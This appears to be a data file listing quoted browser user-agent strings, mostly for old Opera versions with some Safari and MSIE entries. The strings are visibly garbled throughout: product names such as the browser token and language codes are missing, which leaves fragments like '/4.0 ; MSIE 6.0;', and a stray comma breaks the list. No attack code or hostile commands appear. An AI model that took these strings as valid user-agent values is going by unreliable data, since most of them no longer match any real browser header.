	"/5.0 Windows NT 5.1; U;   8.52"
	"/5.0 Windows NT 5.1; U;   8.52"
	"/4.0 ; MSIE 6.0; X11; Linux i686;   8.52"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; pl  8.52"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.52"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.52"
	"/4.0 ; MSIE 6.0; Windows NT 5.0;   8.52"
	"/4.0 ; MSIE 6.0; Windows 98;   8.52"
	"/8.51 X11; U; Linux i686; -US; rv:1.8"
	"/8.51 X11; Linux x86_64; U; "
	"/8.51 X11; Linux i686; U; "
	"/8.51 Windows NT 5.1; U; pl"
	"/8.51 Windows NT 5.1; U; nb"
	"/8.51 Windows NT 5.1; U; fr"
	"/8.51 Windows NT 5.1; U; "
	"/8.51 Windows NT 5.1; U; "
	"/8.51 Windows NT 5.0; U; "
	"/8.51 Windows 98; U; "
	"/8.51 Macintosh; PPC Mac OS X; U; "
	"/8.51 FreeBSD 5.1; U; "
	"/5.0 Windows NT 5.1; U;   8.51"
	"/5.0 Windows NT 5.1; U; fr  8.51"
	"/5.0 Windows NT 5.1; U;   8.51"
	"/5.0 Windows ME; U;   8.51"
	"/5.0 Macintosh; PPC Mac OS X; U;   8.51"
	"/4.0 ; MSIE 6.0; X11; Linux i686;   8.51"
	"/4.0 ; MSIE 6.0; X11; Linux i686;   8.51"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; sv  8.51"
	"/8.50 Windows NT 5.1; U; "
	"/8.50 Windows NT 5.1; U; pl"
	"/8.50 Windows NT 5.1; U; fr"
	"/8.50 Windows NT 5.1; U; es-ES"
	"/8.50 Windows NT 5.1; U; "
	"/8.50 Windows NT 5.1; U; "
	"/8.50 Windows NT 5.0; U; fr"
	"/8.50 Windows NT 5.0; U; "
	"/8.50 Windows NT 5.0; U; "
	"/8.50 Windows NT 4.0; U; zh-"
	"/8.50 Windows ME; U; "
	"/8.50 Windows 98; U; "
	"/8.50 Windows 98; U; "
	"/5.0 Windows NT 5.1; U;   8.50"
	"/5.0 Windows NT 5.1; U;   8.50"
	"/5.0 Windows NT 5.0; U;   8.50"
	"/4.0 ; MSIE 6.0; Windows NT 5.2;   8.50"
	"/4.0 ; MSIE 6.0; Windows NT 5.2;   8.50"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; tr  8.50"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; sv  8.50"
	"/8.10 Windows NT 5.1; U; "
	"/8.02 Windows NT 5.1; U; "
	"/8.02 Windows NT 5.1; U; "
	"/8.02 Windows NT 5.1; U; "
	"/5.0 Windows NT 5.1; U;   8.02"
	"/4.0 ; MSIE 6.0; X11; Linux i686;   8.02"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.02"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.02"
	"/4.0 ; MSIE 6.0; Windows NT 5.0;   8.02"
	"/4.0 ; MSIE 6.0; Windows NT 5.0;   8.02"
	"/4.0 ; MSIE 6.0; Windows ME; pl  8.02"
	"/4.0 ; MSIE 6.0; Windows 98;   8.02"
	"/8.01 Windows NT 5.1; U; pl"
	"/8.01 Windows NT 5.1; U; fr"
	"/8.01 Windows NT 5.1; U; "
	"/8.01 Windows NT 5.1; U; "
	"/8.01 Windows NT 5.0; U; "
	"/8.01 Macintosh; U; PPC Mac OS; "
	"/8.01 Macintosh; PPC Mac OS X; U; "
	"/5.0 Windows NT 5.1; U;   8.01"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.01"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.01"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.01"
	"/8.00 Windows NT 5.1; U; "
,	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.00"
	"/8.0 X11; Linux i686; U; cs"
	"/8.0 Windows NT 5.1; U; "
	"/5.0 Windows NT 5.1; U;   8.0"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.0"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; IT  8.0"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.0"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.0"
	"/4.0 ; MSIE 6.0; Windows NT 5.0;   8.0"
	"/4.0 ; MSIE 6.0; Windows NT 5.0;   8.0"
	"/4.0 ; MSIE 6.0; Windows CE  8.0  []"
	"/4.0 ; MSIE 6.0; Windows 98;   8.0"
	"/5.0 X11; Linux i386; U  7.60  [-GB]"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   7.60"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.54u1  []"
	"/4.0 ; MSIE 6.0; Windows 98  7.54u1  []"
	"/7.54 X11; Linux i686; U  []"
	"/7.54 Windows NT 5.1; U []"
	"/7.54 Windows NT 5.1; U  []"
	"/7.54 Windows NT 5.1; U  []"
	"/7.54 Windows NT 5.1; U  []"
	"/7.54 Windows NT 5.0; U  []"
	"/7.54 Windows NT 5.0; U  []"
	"/7.54 Windows 98; U  []"
	"/5.0 X11; Linux i686; U  7.54 []"
	"/5.0 X11; Linux i686; U  7.54  []"
	"/5.0 Windows NT 5.1; U  7.54  []"
	"/5.0 Windows NT 5.0; U  7.54  []"
	"/4.78 Windows NT 5.1; U  7.54  []"
	"/4.0 ; MSIE 6.0; X11; Linux i686  7.54  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.54 []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.54  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.54  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.54  [pl]"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.54  []"
	"/4.0 ; MSIE 5.23; Mac_PowerPC  7.54  []"
	"/7.53 X11; Linux i686; U [en_US]"
	"/7.53 Windows NT 5.1; U  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.53  []"
	"/4.0 ; MSIE 6.0; Windows ME  7.53  []"
	"/7.52 Windows NT 5.1; U []"
	"/7.52 Windows NT 5.1; U  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.52 []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.52  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.52  []"
	"/7.51 X11; SunOS ; U []"
	"/7.51 Windows NT 5.1; U []"
	"/7.51 Linux []"
	"/4.78 Windows NT 5.1; U  7.51  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.51  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.51  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.51  []"
	"/7.50 Windows XP; U"
	"/7.50 Windows NT 5.1; U  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.50  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.50  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.50  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.50  []"
	"/4.0 ; MSIE 6.0; Windows 98  7.50  []"
	"/4.0 ; MSIE 6.0; ; Linux x86_64  7.50 []"
	"/4.0 ; MSIE 6.0; ; Linux i686  7.50 []"
	"/7.23 Windows NT 6.0; U  [zh-]"
	"/7.23 Windows NT 5.1; U; sv"
	"/7.23 Windows NT 5.0; U []"
	"/7.23 Windows NT 5.0; U  [fr]"
	"/7.23 Windows NT 5.0; U  []"
	"/7.23 Windows 98; U []"
	"/4.0 ; MSIE 6.0; X11; Linux i686  7.23  [fi]"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.23 []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.23  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.23  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.23  [-GB]"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.23  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.23  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.23  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.23  []"
	"/4.0 ; MSIE 6.0; Windows NT 4.0  7.23  []"
	"/4.0 ; MSIE 6.0; Windows 98  7.23  []"
	"/7.22 Windows NT 5.1; U  []"
	"/7.21 Windows NT 5.1; U  []"
	"/5.0 Windows NT 5.0; U  7.21  []"
	"/7.20 Windows NT 5.1; U  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.20  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.20  []"
	"/4.0 ; MSIE 6.0; Windows 98  7.20  []"
	"/4.0 ; MSIE 6.0; Windows 98  7.20  []"
	"/7.11 Windows NT 5.1; U  [pl]"
	"/7.11 Windows NT 5.1; U  []"
	"/7.11 Windows NT 5.1; U  []"
	"/7.11 Windows NT 5.0; U  []"
	"/7.11 Windows NT 5.0; U  []"
	"/7.11 Windows 98; U  []"
	"/7.11 Windows 98; U  []"
	"/7.11 Linux 2.6.0-test4 i686; U  []"
	"/5.0 Windows NT 5.1; U  7.11  []"
	"/5.0 Windows NT 5.0; U  7.11  []"
	"/5.0 Linux 2.4.21-0.13mdk i686; U  7.11  []"
	"/4.78 Windows NT 5.0; U  7.11  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.11  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.11  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.11  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.11  [fr]"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.11  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.11  []"
	"/4.0 ; MSIE 6.0; Windows NT 4.0  7.11  []"
	"/4.0 ; MSIE 6.0; Windows ME  7.11  []"
	"/7.10 Windows NT 5.1; U  []"
	"/7.10 Windows NT 5.0; U  []"
	"/7.10 Windows NT 4.0; U  []"
	"/7.10 Linux ;-US"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.10  [fr]"
	"/4.0 ; MSIE 6.0; Windows NT 5.1  7.10  []"
	"/4.0 ; MSIE 6.0; Windows NT 5.0  7.10  []"
	"/4.0 ; MSIE 6.0; Windows NT 4.0  7.10  []"
	"/3.0 Windows NT 5.0; U  7.10  []"
	"/7.03 Windows NT 5.1; U  []"
	"/7.03 Windows NT 5.1; U  []"
	"/7.03 Windows NT 5.0; U  []"
	"/7.03 Windows NT 5.0; U  []"
	"/7.03 Windows NT 4.0; U  []"
	"/7.03 Windows 98; U  []"
	"/7.03 Windows 98; U  []"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.6 Gecko/2009020911 /8.10  "
	"/5.0 Windows NT 5.1; U  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.0  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.0  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows ME  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows 98  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows 98  7.03  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows 95  7.03  []"
	"/7.02 Windows NT 5.1; U  [fr]"
	"/7.02 Windows 98; U  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1  7.02  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1  7.02  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 4.0  7.02  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows ME  7.02  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows 98  7.02  []"
	"/7.01 Windows NT 5.1; U  []"
	"/7.01 Windows NT 5.0; U  []"
	"/7.01 Windows 98; U  [fr]"
	"/7.01 Windows 98; U  []"
	"/5.0 Windows NT 5.0; U  7.01  []"
	"/4.78 Windows NT 5.0; U  7.01  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1  7.01  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1  7.01  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.0  7.01  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows 98  7.01  []"
	"/3.0 Windows NT 5.0; U  7.01  []"
	"/7.0 Windows NT 5.1; U  []"
	"/7.0 Windows NT 4.0; U  []"
	"/7.0 Windows NT 4.0; U  []"
	"/7.0 Windows 98; U  []"
	"/7.0 Windows 2000; U  []"
	"/7.0 Windows 2000; U  []"
	"/5.0 Windows 2000; U  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows XP  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.1  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.0  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 5.0  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows NT 4.0  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows ME  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows 98  7.0  []"
	"/4.0 ; MSIE 6.0; MSIE 5.5; Windows 2000  7.0  []"
	"/6.12 Linux 2.4.20-4GB i686; U  []"
	"/6.12 Linux 2.4.18-14cpq i686; U  []"
	"/4.0 ; MSIE 5.0; UNIX  6.12  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.20-4GB i686  6.12  []"
	"/6.11 Linux 2.4.18-bf2.4 i686; U  []"
	"/6.11 Linux 2.4.18-4GB i686; U  []"
	"/6.11 Linux 2.4.10-4GB i686; U  []"
	"/6.11 FreeBSD 4.7-RELEASE i386; U  []"
	"/5.0 Linux 2.4.19-16mdk i686; U  6.11  []"
	"/4.0 ; MSIE 5.0; UNIX  6.11  [fr]"
	"/4.0 ; MSIE 5.0; UNIX  6.11  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.4 i686  6.11  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.20-13.7 i686  6.11  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.19-4GB i686  6.11  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.19-16mdk i686  6.11  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.18 i686  6.11  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.10-4GB i686  6.11  []"
	"/5.0 Linux 2.4.18--1 i686; U  6.1  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.19 i686  6.1  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.18-4GB i686  6.1  []"
	"/5.0 Windows XP; U  6.06  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.06  [fr]"
	"/4.0 ; MSIE 5.0; Windows XP  6.06  []"
	"/6.05 Windows XP; U []"
	"/6.05 Windows XP; U  []"
	"/6.05 Windows XP; U  []"
	"/6.05 Windows NT 4.0; U  [ro]"
	"/6.05 Windows NT 4.0; U  [fr]"
	"/6.05 Windows NT 4.0; U  []"
	"/6.05 Windows ME; U  [fr]"
	"/6.05 Windows ME; U  []"
	"/6.05 Windows 98; U  [fr]"
	"/6.05 Windows 98; U  []"
	"/6.05 Windows 98; U  []"
	"/6.05 Windows 2000; U  [oc]"
	"/6.05 Windows 2000; U  []"
	"/6.05 Windows 2000; U  []"
	"/6.05 Windows 2000; U  [fr]"
	"/6.05 Windows 2000; U  []"
	"/6.05 Windows 2000; U  []"
	"/5.0 Windows XP; U  6.05  []"
	"/5.0 Windows NT 4.0; U  6.05  []"
	"/5.0 Windows ME; U  6.05  []"
	"/6.04 Windows XP; U  []"
	"/6.04 Windows XP; U  []"
	"/6.04 Windows NT 4.0; U  []"
	"/6.04 Windows NT 4.0; U  []"
	"/6.04 Windows 98; U  [-GB]"
	"/6.04 Windows 2000; U  []"
	"/6.04 Windows 2000; U  []"
	"/5.0 Windows 2000; U  6.04  []"
	"/4.78 Windows 2000; U  6.04  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.04  [fr]"
	"/4.0 ; MSIE 5.0; Windows XP  6.04  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.04  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  6.04  []"
	"/4.0 ; MSIE 5.0; Windows 98  6.04  [pl]"
	"/4.0 ; MSIE 5.0; Windows 98  6.04  []"
	"/4.0 ; MSIE 5.0; Windows 2000  6.04  []"
	"/4.0 ; MSIE 5.0; Windows 2000  6.04  []"
	"/6.04 Windows XP; U  []"
	"/6.04 Windows 2000; U  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.04  []"
	"/6.03 Windows NT 4.0; U  []"
	"/6.03 Windows 98; U []"
	"/6.03 Windows 2000; U  []"
	"/6.03 Linux 2.4.18-18.7.x i686; U  []"
	"/5.0 Windows 2000; U  6.03  []"
	"/5.0 Linux 2.4.18-18.7.x i686; U  6.03  []"
	"/4.0 ; MSIE 5.0; Windows 98  6.03  []"
	"/4.0 ; MSIE 5.0; Windows 2000  6.03  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.20-4GB i686  6.03  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.19-4GB i686  6.03  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.18-4GB i686  6.03  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.0-64GB-SMP i686  6.03  []"
	"/6.02 Windows NT 4.0; U  []"
	"/5.0 Windows 2000; U  6.02  []"
	"/5.0 Linux; U  6.02  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  6.02  []"
	"/4.0 ; MSIE 5.0; Windows 95  6.02  []"
	"/4.0 ; MSIE 5.0; Windows 95  6.02  []"
	"/4.0 ; MSIE 5.0; Windows 2000  6.02  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.20-686 i686  6.02  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.18-4GB i686  6.02  []"
	"/6.02 Windows NT 4.0; U  []"
	"/6.01 X11; U; "
	"/6.01 Windows XP; U  []"
	"/6.01 Windows 98; U  []"
	"/6.01 Windows 98; U  []"
	"/6.01 Windows 2000; U  []"
	"/6.01 Windows 2000; U  []"
	"/5.0 Windows 2000; U  6.01  []"
	"/5.0 Windows 2000; U  6.01  []"
	"/4.78 Windows 2000; U  6.01  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.01  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.01  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.01  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  6.01  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  6.01  []"
	"/4.0 ; MSIE 5.0; Windows ME  6.01  []"
	"/4.0 ; MSIE 5.0; Windows ME  6.01  []"
	"/4.0 ; MSIE 5.0; Windows 98  6.01  []"
	"/4.0 ; MSIE 5.0; Windows 98  6.01  [fr]"
	"/4.0 ; MSIE 5.0; Windows 98  6.01  []"
	"/4.0 ; MSIE 5.0; Windows 98  6.01  []"
	"/6.0 Windows XP; U  []"
	"/6.0 Windows ME; U  []"
	"/6.0 Windows 2000; U  [fr]"
	"/6.0 Windows 2000; U  []"
	"/6.0 Macintosh; PPC Mac OS X; U"
	"/4.76 Windows NT 4.0; U  6.0  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.0  []"
	"/4.0 ; MSIE 5.0; Windows XP  6.0  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  6.0  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  6.0  []"
	"/4.0 ; MSIE 5.0; Windows ME  6.0  []"
	"/4.0 ; MSIE 5.0; Windows 98  6.0 []"
	"/4.0 ; MSIE 5.0; Windows 98  6.0  [fr]"
	"/4.0 ; MSIE 5.0; Windows 98  6.0  []"
	"/4.0 ; MSIE 5.0; Windows 98  6.0  []"
	"/4.0 ; MSIE 5.0; Windows 2000  6.0 []"
	"/4.0 ; MSIE 5.0; Windows 2000  6.0  []"
	"/4.0 ; MSIE 5.0; Windows 2000  6.0  []"
	"/4.0 ; MSIE 5.0; Mac_PowerPC  6.0  []"
	"/4.0 ; MSIE 5.0; Mac_PowerPC  6.0  []"
	"/5.12 Windows NT 5.1; U  []"
	"/5.12 Windows 98; U  []"
	"/5.0 Windows 98; U  5.12  []"
	"/4.76 Windows NT 4.0; U  5.12  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  5.12  []"
	"/4.0 ; MSIE 5.0; Windows ME  5.12  []"
	"/4.0 ; MSIE 5.0; Windows ME  5.12  []"
	"/4.0 ; MSIE 5.0; Windows 98  5.12  []"
	"/4.0 ; MSIE 5.0; Windows 98  5.12  []"
	"/4.0 ; MSIE 5.0; Windows 98  5.12  []"
	"/4.0 ; MSIE 5.0; Mac_PowerPC  5.12  []"
	"/5.12 Windows NT 5.1; U  []"
	"/5.11 Windows 98; U  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  5.11  []"
	"/4.0 ; MSIE 5.0; Windows ME  5.11 []"
	"/5.02 Windows 98; U  []"
	"/5.02 Macintosh; U; "
	"/4.0 ; MSIE 5.0; Windows NT 5.1  5.02  []"
	"/4.0 ; MSIE 5.0; Windows NT 4.0  5.02  []"
	"/4.0 ; MSIE 5.0; Windows 98  5.02  []"
	"/5.02 Windows NT 5.0; U []"
	"/5.0 ; U; Windows NT 6.1; es; rv:1.9.2.13 Gecko/20101203 Firefox/3.6.13"
	"/5.0 SunOS 5.8 ; U  []"
	"/5.0 SunOS 5.8 ; U  5.0 []"
	"/4.0 ; MSIE 5.0; SunOS 5.8   5.0  []"
	"/4.0 ; MSIE 5.0; Mac_PowerPC  5.0  []"
	"/4.0 ; MSIE 5.0; Linux  5.0  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.4-4GB i686  5.0  []"
	"/4.0 ; MSIE 5.0; Linux 2.4.0-4GB i686  5.0  []"
	"/4.02 Windows 98; U []"
	"/5.0 Macintosh; ; Intel Mac OS X; fr; rv:1.8.1.1 Gecko/20061204 "
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  "
	"/4.0 ; MSIE 6.0; Windows CE "
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A"
	"/5.0 ; CPU OS 6_0  Mac OS X /536.26 KHTML,  Gecko /6.0 / Safari/8536.25"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /537.13+ KHTML,  Gecko /5.1.7 Safari/534.57.2"
	"/5.0 Macintosh; Intel Mac OS X 10_7_3 /534.55.3 KHTML,  Gecko /5.1.3 Safari/534.53.10"
	"/5.0 ; CPU OS 5_1  Mac OS X /534.46 KHTML,  Gecko  /5.1 /9B176 Safari/7534.48.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_8; - /533.21.1 KHTML,  Gecko /5.0.5 Safari/533.21.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_7; -dk /533.21.1 KHTML,  Gecko /5.0.5 Safari/533.21.1"
	"/5.0 Windows; U; Windows NT 6.1; tr-TR /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Windows; U; Windows NT 6.1; ko-KR /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Windows; U; Windows NT 6.1; fr-FR /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Windows; U; Windows NT 6.1; cs-CZ /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Windows; U; Windows NT 6.0; -JP /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; zh- /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; - /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_7; - /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; zh- /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; sv- /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; ko-kr /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; - /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; - /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; fr-fr /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; es-es /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; -us /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; -gb /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; - /533.20.25 KHTML,  Gecko /5.0.4 Safari/533.20.27"
	"/5.0 Windows; U; Windows NT 6.1; sv-SE /533.19.4 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 6.1; -JP /533.20.25 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 6.1; -DE /533.20.25 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 6.0; -HU /533.19.4 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.20.25 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 6.0; -DE /533.20.25 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 5.1; -RU /533.19.4 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 5.1; -JP /533.20.25 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 5.1; -IT /533.20.25 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 5.1; -US /533.20.25 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_7; -us /534.16+ KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; fr-ch /533.19.4 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_5; - /534.15+ KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_5; ar /533.19.4 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0  2.2; Windows; U; Windows NT 6.1; -US /533.19.4 KHTML,  Gecko /5.0.3 Safari/533.19.4"
	"/5.0 Windows; U; Windows NT 6.1; zh-HK /533.18.1 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.19.4 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 Windows; U; Windows NT 6.0; tr-TR /533.18.1 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 Windows; U; Windows NT 6.0; nb-NO /533.18.1 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 Windows; U; Windows NT 6.0; fr-FR /533.18.1 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW /533.19.4 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 Windows; U; Windows NT 5.1; -RU /533.18.1 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; zh- /533.18.1 KHTML,  Gecko /5.0.2 Safari/533.18.5"
	"/5.0 ; U; CPU  OS 4_3_3  Mac OS X; - /533.17.9 KHTML,  Gecko /5.0.2 /8J2 Safari/6533.18.5"
	"/5.0 ; U; CPU  OS 4_3_1  Mac OS X; zh- /533.17.9 KHTML,  Gecko /5.0.2 /8G4 Safari/6533.18.5"
	"/5.0 ; U; CPU  OS 4_2_1  Mac OS X; -il /533.17.9 KHTML,  Gecko /5.0.2 /8C148 Safari/6533.18.5"
	"/5.0 ; U; ; CPU  OS 4_2_1  Mac OS X;  /533.17.9 KHTML,  Gecko /5.0.2 / Safari/6533.18.5"
	"/5.0 ; U; ; CPU  OS 4_2_1  Mac OS X; fr /533.17.9 KHTML,  Gecko /5.0.2 / Safari/6533.18.5"
	"/5.0 ; U; fr; CPU  OS 4_2_1  Mac OS X; fr /533.17.9 KHTML,  Gecko /5.0.2 / Safari/6533.18.5"
